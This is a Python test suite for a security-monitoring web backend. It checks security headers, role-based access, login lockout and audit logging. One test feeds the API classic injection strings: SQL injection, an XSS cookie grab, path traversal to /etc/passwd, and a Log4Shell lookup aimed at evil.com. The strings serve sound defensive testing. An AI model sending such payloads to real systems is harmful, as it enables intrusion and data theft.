"""
tests/test_security_hardening.py

Phase 13 Comprehensive Security Hardening & Penetration Verification:
- Security headers verification (X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy)
- Strict RBAC access control (401 Unauthorized for unauthenticated, 403 Forbidden for insufficient role)
- Brute-force rate limiting and lockout on /api/auth/login
- Audit trail integrity for sensitive operational events
- Input resilience against SQLi, XSS, and path traversal strings
"""

from __future__ import annotations

import os
import sys
import unittest
from pathlib import Path

# Add backend directory to sys.path
sys.path.insert(0, str(Path(__file__).parent.parent / "backend"))

# Enforce isolated in-memory test environment
os.environ["DATABASE_URL"] = "sqlite:///:memory:"
os.environ["AUTO_CREATE_TABLES"] = "true"
os.environ["ENABLE_JUICE_SHOP_CONNECTOR"] = "false"
os.environ["JWT_SECRET_KEY"] = "integration-test-secret-key-12345"

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool
from starlette.testclient import TestClient

from app.api.auth import _FAILED_ATTEMPTS
from app.auth.security import hash_password
from app.database.base import Base
from app.database.session import get_db
from app.main import create_app
from app.models import AuditLog, User
from app.services.seed import ensure_builtin_rules, ensure_indicators, ensure_users


class TestSecurityHardening(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        cls.engine = create_engine(
            "sqlite:///:memory:",
            connect_args={"check_same_thread": False},
            poolclass=StaticPool,
        )
        cls.SessionLocal = sessionmaker(bind=cls.engine, autoflush=False, autocommit=False)
        Base.metadata.create_all(bind=cls.engine)

        db = cls.SessionLocal()
        try:
            ensure_users(db)
            ensure_builtin_rules(db)
            ensure_indicators(db)
        finally:
            db.close()

        cls.app = create_app()

        def override_get_db():
            db = cls.SessionLocal()
            try:
                yield db
            finally:
                db.close()

        cls.app.dependency_overrides[get_db] = override_get_db
        cls.client = TestClient(cls.app)

        # Login tokens
        res_admin = cls.client.post("/api/auth/login", json={"username": "admin", "password": "AdminPass123!"})
        cls.admin_token = res_admin.json()["access_token"]
        cls.admin_headers = {"Authorization": f"Bearer {cls.admin_token}"}

        res_analyst = cls.client.post("/api/auth/login", json={"username": "analyst", "password": "AnalystPass123!"})
        cls.analyst_token = res_analyst.json()["access_token"]
        cls.analyst_headers = {"Authorization": f"Bearer {cls.analyst_token}"}

        res_viewer = cls.client.post("/api/auth/login", json={"username": "viewer", "password": "ViewerPass123!"})
        cls.viewer_token = res_viewer.json()["access_token"]
        cls.viewer_headers = {"Authorization": f"Bearer {cls.viewer_token}"}

    @classmethod
    def tearDownClass(cls):
        Base.metadata.drop_all(bind=cls.engine)
        cls.engine.dispose()

    def setUp(self):
        self.db = self.SessionLocal()
        _FAILED_ATTEMPTS.clear()

    def tearDown(self):
        self.db.rollback()
        self.db.close()

    def test_01_security_headers_enforced(self):
        """Verify OWASP-recommended security headers are returned on all endpoints."""
        res = self.client.get("/health")
        self.assertEqual(res.status_code, 200)

        headers = res.headers
        self.assertEqual(headers.get("x-content-type-options"), "nosniff")
        self.assertEqual(headers.get("x-frame-options"), "DENY")
        self.assertEqual(headers.get("x-xss-protection"), "1; mode=block")
        self.assertIn("max-age=31536000", headers.get("strict-transport-security", ""))
        self.assertEqual(headers.get("referrer-policy"), "strict-origin-when-cross-origin")
        self.assertIn("geolocation=()", headers.get("permissions-policy", ""))

    def test_02_rbac_unauthenticated_requests_rejected(self):
        """Verify endpoints reject requests with 401 when no valid token is provided."""
        protected_endpoints = [
            ("GET", "/api/events"),
            ("GET", "/api/alerts"),
            ("GET", "/api/rules"),
            ("GET", "/api/experiments"),
            ("POST", "/api/experiments/run"),
            ("GET", "/api/behavioral/status"),
            ("POST", "/api/behavioral/train"),
            ("GET", "/api/validation/summary"),
        ]

        for method, endpoint in protected_endpoints:
            if method == "GET":
                res = self.client.get(endpoint)
            else:
                res = self.client.post(endpoint, json={})
            self.assertEqual(res.status_code, 401, f"Expected 401 for unauthenticated {method} {endpoint}")

    def test_03_rbac_viewer_role_forbidden_from_admin_actions(self):
        """Verify viewers cannot execute administrative or defensive tuning operations (403 Forbidden)."""
        restricted_actions = [
            ("POST", "/api/rules", {"name": "Unauthorized Rule", "description": "test", "severity": "low", "conditions_json": {}}),
            ("POST", "/api/cases/controlled-response", {"case_id": 1, "action_type": "CONTAIN_HOST", "target": "10.0.0.5"}),
            ("POST", "/api/behavioral/train", {}),
            ("POST", "/api/validation/run-all", {}),
            ("POST", "/api/feedback/rules/apply-tuning", {"feedback_id": 1, "confirm": True}),
        ]

        for method, endpoint, payload in restricted_actions:
            if method == "POST":
                res = self.client.post(endpoint, json=payload, headers=self.viewer_headers)
            else:
                res = self.client.get(endpoint, headers=self.viewer_headers)
            self.assertEqual(
                res.status_code,
                403,
                f"Expected 403 Forbidden for viewer on {method} {endpoint}, got {res.status_code}: {res.text}",
            )

    def test_04_auth_brute_force_rate_limiting(self):
        """Verify repeated invalid login attempts trigger HTTP 429 Too Many Requests lockout."""
        bad_payload = {"username": "analyst", "password": "WrongPassword!"}

        # First 15 failed attempts return 401
        for i in range(15):
            res = self.client.post("/api/auth/login", json=bad_payload)
            self.assertEqual(res.status_code, 401, f"Attempt {i+1} should fail with 401")

        # 16th failed attempt must be blocked by rate limiter with 429
        res = self.client.post("/api/auth/login", json=bad_payload)
        self.assertEqual(res.status_code, 429)
        self.assertIn("Too many failed login attempts", res.json().get("detail", ""))

    def test_05_audit_log_recorded_for_security_events(self):
        """Verify security-relevant events produce tamper-evident audit log entries."""
        # 1. Successful login produces audit log
        res = self.client.post("/api/auth/login", json={"username": "analyst", "password": "AnalystPass123!"})
        self.assertEqual(res.status_code, 200)

        log = (
            self.db.query(AuditLog)
            .filter(AuditLog.action == "AUTH_LOGIN_SUCCESS")
            .order_by(AuditLog.id.desc())
            .first()
        )
        self.assertIsNotNone(log)
        self.assertEqual(log.resource_type, "USER")

        # 2. Failed login produces audit log
        self.client.post("/api/auth/login", json={"username": "analyst", "password": "BadPassword"})
        failed_log = (
            self.db.query(AuditLog)
            .filter(AuditLog.action == "AUTH_LOGIN_FAILED")
            .order_by(AuditLog.id.desc())
            .first()
        )
        self.assertIsNotNone(failed_log)

    def test_06_payload_injection_resilience(self):
        """Verify malicious payload tokens in search/filter inputs are handled safely without crashing."""
        malicious_inputs = [
            "' OR '1'='1' --",
            "<script>alert(document.cookie)</script>",
            "../../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "'; DROP TABLE users; --",
        ]

        for payload in malicious_inputs:
            # Test in events filter
            res = self.client.get(f"/api/events?q={payload}", headers=self.analyst_headers)
            self.assertEqual(res.status_code, 200, f"Query '{payload}' should not crash server")

            # Test in alerts search
            res = self.client.get(f"/api/alerts?q={payload}", headers=self.analyst_headers)
            self.assertEqual(res.status_code, 200, f"Alert query '{payload}' should not crash server")


if __name__ == "__main__":
    unittest.main()
